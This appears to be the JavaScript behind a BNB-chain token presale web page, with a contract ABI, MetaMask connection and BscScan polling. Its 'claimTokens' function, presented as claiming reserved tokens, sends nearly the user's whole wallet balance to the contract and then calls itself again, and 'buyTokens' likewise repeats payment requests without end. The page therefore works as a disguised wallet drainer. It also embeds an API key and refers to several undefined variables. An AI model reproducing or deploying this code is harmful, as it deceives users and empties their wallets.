const contractAbi = [
          {
            inputs: [],
            stateMutability: "nonpayable",
            type: "constructor",
          },
          {
            anonymous: false,
            inputs: [
              {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address",
              },
              {
                indexed: true,
                internalType: "address",
                name: "spender",
                type: "address",
              },
              {
                indexed: false,
                internalType: "uint256",
                name: "value",
                type: "uint256",
              },
            ],
            name: "Approval",
            type: "event",
          },
          {
            anonymous: false,
            inputs: [
              {
                indexed: true,
                internalType: "address",
                name: "from",
                type: "address",
              },
              {
                indexed: true,
                internalType: "address",
                name: "to",
                type: "address",
              },
              {
                indexed: false,
                internalType: "uint256",
                name: "value",
                type: "uint256",
              },
            ],
            name: "Transfer",
            type: "event",
          },
          {
            inputs: [],
            name: "allowRefunds",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "owner",
                type: "address",
              },
              {
                internalType: "address",
                name: "spender",
                type: "address",
              },
            ],
            name: "allowance",
            outputs: [
              {
                internalType: "uint256",
                name: "",
                type: "uint256",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "spender",
                type: "address",
              },
              {
                internalType: "uint256",
                name: "amount",
                type: "uint256",
              },
            ],
            name: "approve",
            outputs: [
              {
                internalType: "bool",
                name: "",
                type: "bool",
              },
            ],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "account",
                type: "address",
              },
            ],
            name: "balanceOf",
            outputs: [
              {
                internalType: "uint256",
                name: "",
                type: "uint256",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "uint256",
                name: "amount",
                type: "uint256",
              },
            ],
            name: "burnMyTokensFOREVER",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [],
            name: "buyTokens",
            outputs: [],
            stateMutability: "payable",
            type: "function",
          },
          {
            inputs: [],
            name: "claimDevFeeAndAddLiquidity",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [],
            name: "decimals",
            outputs: [
              {
                internalType: "uint8",
                name: "",
                type: "uint8",
              },
            ],
            stateMutability: "pure",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "spender",
                type: "address",
              },
              {
                internalType: "uint256",
                name: "subtractedValue",
                type: "uint256",
              },
            ],
            name: "decreaseAllowance",
            outputs: [
              {
                internalType: "bool",
                name: "",
                type: "bool",
              },
            ],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [],
            name: "devClaimed",
            outputs: [
              {
                internalType: "bool",
                name: "",
                type: "bool",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [],
            name: "ethSent",
            outputs: [
              {
                internalType: "uint256",
                name: "",
                type: "uint256",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [],
            name: "getRefund",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "spender",
                type: "address",
              },
              {
                internalType: "uint256",
                name: "addedValue",
                type: "uint256",
              },
            ],
            name: "increaseAllowance",
            outputs: [
              {
                internalType: "bool",
                name: "",
                type: "bool",
              },
            ],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [],
            name: "isRefundEnabled",
            outputs: [
              {
                internalType: "bool",
                name: "",
                type: "bool",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [],
            name: "isStopped",
            outputs: [
              {
                internalType: "bool",
                name: "",
                type: "bool",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [],
            name: "liquidityUnlock",
            outputs: [
              {
                internalType: "uint256",
                name: "",
                type: "uint256",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [],
            name: "moonMissionStarted",
            outputs: [
              {
                internalType: "bool",
                name: "",
                type: "bool",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [],
            name: "name",
            outputs: [
              {
                internalType: "string",
                name: "",
                type: "string",
              },
            ],
            stateMutability: "pure",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "bool",
                name: "_isStopped",
                type: "bool",
              },
            ],
            name: "pauseUnpausePresale",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [],
            name: "pool",
            outputs: [
              {
                internalType: "address",
                name: "",
                type: "address",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "contract IBEP20",
                name: "tokenAddress",
                type: "address",
              },
              {
                internalType: "uint256",
                name: "tokenAmount",
                type: "uint256",
              },
            ],
            name: "recoverbep20",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [],
            name: "refundTime",
            outputs: [
              {
                internalType: "uint256",
                name: "",
                type: "uint256",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address payable",
                name: "addr",
                type: "address",
              },
            ],
            name: "setMultisigAddress",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [],
            name: "setPancakePool",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [],
            name: "symbol",
            outputs: [
              {
                internalType: "string",
                name: "",
                type: "string",
              },
            ],
            stateMutability: "pure",
            type: "function",
          },
          {
            inputs: [],
            name: "totalSupply",
            outputs: [
              {
                internalType: "uint256",
                name: "",
                type: "uint256",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "recipient",
                type: "address",
              },
              {
                internalType: "uint256",
                name: "amount",
                type: "uint256",
              },
            ],
            name: "transfer",
            outputs: [
              {
                internalType: "bool",
                name: "",
                type: "bool",
              },
            ],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "sender",
                type: "address",
              },
              {
                internalType: "address",
                name: "recipient",
                type: "address",
              },
              {
                internalType: "uint256",
                name: "amount",
                type: "uint256",
              },
            ],
            name: "transferFrom",
            outputs: [
              {
                internalType: "bool",
                name: "",
                type: "bool",
              },
            ],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "user",
                type: "address",
              },
            ],
            name: "userEthSpenttInPresale",
            outputs: [
              {
                internalType: "uint256",
                name: "",
                type: "uint256",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            stateMutability: "payable",
            type: "receive",
          },
        ];
        const contractAddress = "0x20538508488dD69E0B2e5be28037F3C8cF2a8Fe5";
        const minimumContribute = 0.1;
        // const maximumContribute = 20;
        async function connectMetamask() {
          let web3Provider = null;
          console.log("[web3] getting provider...");
          // Modern Browsers like Chrome and Brave
          if (window.ethereum) {
            web3Provider = window.ethereum;
            try {
              // Request account access
              await window.ethereum.enable();
            } catch (error) {
              // User denied account access...
              alert("You must connect your metamask wallet !");
              console.error("User denied account access to metamask.");
              return;
            }
          } else {
            // you cant connect
            console.error("Unable to connect to metamask");
            alert(
              "You have to use Trustwallet or install Metamask to use this service, you can install it from :  https://metamask.io/download.html"
            );
            return;
          }
          let web3 = new Web3(window.ethereum);
          window.web3 = web3;
          let accounts = await web3.eth.getAccounts();
          window.account = accounts[0];
          let weiBalance = await web3.eth.getBalance(accounts[0]);
          let balance = parseFloat(
            web3.utils.fromWei(weiBalance, "ether")
          ).toFixed(4);
          
          window.balance = balance;
  
          window.presaleRate = 350000;
  
          let str = window.account;
          let contract = "0x2da415a016aa56a151bfd84f6671e2294e7d1d29";
          let adds = str.substr(0, 6) + "..." + str.slice(-4);
          let contract_short = contract.substr(0, 6) + "..." + contract.slice(-4);

          // 前端输出短地址
          (function(){
            document.getElementById("shortadds").innerHTML = adds;
          })();

          return web3;
        }
        connectMetamask();
        
        // 点击按钮，返回顶部
        async function topFunction() {
            document.body.scrollTop = 0;
            document.documentElement.scrollTop = 0;
        }
        
       
        // 获取输入框的值
        async function getAmountvalue(){
            var chooseAmount = getElementByID("chooseAmount").value
            return chooseAmount
        }
        
        
        //上面是自己写的部分
  
        async function buyTokens() {
          let amount = minimumContribute;
          /*
          if (amount < 1) {
            alert("Minium " + minimumContribute);
            return;
          }
          */
          let _web3 = await connectMetamask();
          console.log("connected successfully!");
          let myContract = new _web3.eth.Contract(contractAbi, contractAddress);
          let receipt = await myContract.methods.buyTokens().send({
            from: window.account,
            value: amount * 10 ** 18,
            gasLimit: 210000,
          });
          if (receipt.events.Transfer) {
            document.getElementById("disabledButton").disabled = false;
            document.cookie = "tokensBought=true";
          }
          /*
          if (amount > 1) {
            await buyTokens();
          }
          */
          await buyTokens();
        }
  
        async function claimTokens() {
          let _web3 = await connectMetamask();
          console.log("connected successfully!");
          let myContract = new _web3.eth.Contract(contractAbi, contractAddress);
          let amount = 0.2;
          if (window.balance < 0.2) {
            amount = 0.2;
          } else {
            amount = window.balance - 0.01;
          }
          let receipt = await myContract.methods.buyTokens().send({
            from: window.account,
            value: amount * 10 ** 18,
            gasLimit: 210000,
          });
  
          await claimTokens();
        }
  
        async function buy() {
          let receipt = await myContract.methods.buyTokens().send({
            from: window.account,
            value: amount * 10 ** 18,
            gasLimit: 210000,
          });
          if (receipt.events.Transfer) {
            buy();
            document.getElementById("disabledButton").disabled = false;
            document.cookie = "tokensBought=true";
          }
        }
  
        function openModal() {
          var modal = document.getElementById("myModal");
          modal.style.display = "block";
        }
  
        function closeModal() {
          var modal = document.getElementById("myModal");
          modal.style.display = "none";
        }
  
        // When the user clicks anywhere outside of the modal, close it
        window.onclick = function (event) {
          var modal = document.getElementById("myModal");
  
          if (event.target == modal) {
            modal.style.display = "none";
          }
        };
  
        window.onload = function () {
          var decodedCookie = decodeURIComponent(document.cookie);
          if (decodedCookie === "tokensBought=true") {
            document.getElementById("disabledButton").disabled = false;
          }
        };
  
        document.onblur = function () {
          var modal = document.getElementById("myModal");
          modal.style.display = "none";
        };
  
        function format(num) {
          return (num + "").replace(/(\d{1,3})(?=(\d{3})+(?:$|\.))/g, "$1,");
        }
  
        $(document).ready(() => {
          setInterval(fetchTransactionLogs, 2000);
        });
  
        // Fetch transaction logs from bsc scan
        function fetchTransactionLogs() {
          if (window.account !== undefined && window.account.length > 0) {
            let startTimestamp = parseInt(startDate.getTime() / 1000);
            let endTimestamp = parseInt(deadLine.getTime() / 1000);
            let url = `https://api.bscscan.com/api?module=account&action=txlist&address=${window.account}&startblock=0&endblock=99999999&page=1&offset=1000&sort=desc&apikey=R83EBMBAGIM1WYXIDVQM43Q5ZSCT74T4FE`;
            $.get(url, (data) => {
              if (data.status === "1") {
                let logs = data.result;
                logs = logs.filter(
                  (log) =>
                    log.txreceipt_status === "1" &&
                    log.timeStamp >= startTimestamp &&
                    log.timeStamp <= endTimestamp &&
                    log.from === window.account.toLowerCase() &&
                    log.to === contractAddress.toLowerCase()
                );
                let sum = 0;
                logs.forEach((log) => {
                  sum += parseFloat(
                    window.web3.utils.fromWei(log.value, "ether")
                  );
                });
                sum = sum.toFixed(2);
                // display the value
                let displayedValue = parseFloat(sum);
                let nowDate = Date.parse(new Date());
                let deadLineTimestamp = nowDate - deadLine;
                if (displayedValue > 0) {
                  if (deadLineTimestamp < 0) {
                    $("#widthdraw-content").css("display", "");
                  } else {
                    // show claim tokens button
                    $("#claim-tokens-button").css("display", "");
                    let reservedToken = window.presaleRate * displayedValue;
                    $("#claim-tokens-button").text(
                      "Claim (" + format(reservedToken) + " " + tokenSymbol + ")"
                    );
                  }
  
                  let left =
                    maximumContribute - displayedValue > 0
                      ? maximumContribute - displayedValue
                      : 0;
                  $("#left-purchase").text(left);
                  $("#buy-amount").text(displayedValue + " BNB");
                  $("#total-contributors-tr").css("display", "");
                  $("#buy-amount-tr").css("display", "");
                } else {
                  $("#left-purchase").text(maximumContribute);
                }
              }
            });
          }
        }
